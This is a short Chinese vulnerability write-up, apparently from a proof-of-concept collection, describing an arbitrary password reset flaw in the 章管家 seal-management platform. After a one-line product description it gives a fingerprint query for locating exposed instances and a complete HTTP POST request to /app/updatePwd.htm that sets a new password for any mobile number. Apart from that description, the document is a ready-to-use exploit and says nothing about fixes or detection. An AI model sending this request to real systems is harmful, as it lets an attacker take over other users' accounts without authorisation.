# 章管家updatePwd.htm存在任意账号密码重置漏洞

章管家是上海建业信息科技股份有限公司推出的一款针对传统印章风险管理提供的整套解决方案的工具。

```yaml
app="章管家-印章智慧管理平台"
```

## poc

```java
POST /app/updatePwd.htm HTTP/1.1
Host:
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 87
Content-Type: application/x-www-form-urlencoded

mobile=18888888888&newPassword=12312dsa12&equipmentName=xxxxxx&version=4.0.0&token=dingtalk_token
```

